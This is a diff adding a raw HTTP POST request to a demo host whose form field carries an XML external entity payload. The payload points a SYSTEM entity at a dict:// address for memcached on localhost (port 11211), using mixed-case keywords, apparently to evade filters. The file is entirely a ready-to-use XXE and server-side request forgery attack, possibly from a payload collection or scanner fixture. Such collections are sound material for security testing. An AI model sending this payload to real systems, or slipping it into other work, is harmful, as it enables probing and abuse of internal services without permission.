@@ -1,0 +1,7 @@
+POST /submit HTTP/1.1
+Host: demo.example.com
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 75
+Connection: close
+
+q=<!dOcTyPe R [<!eNtItY x SyStEm "DiCt://127.0.0.1:11211/StAt">]><R>&x;</R>
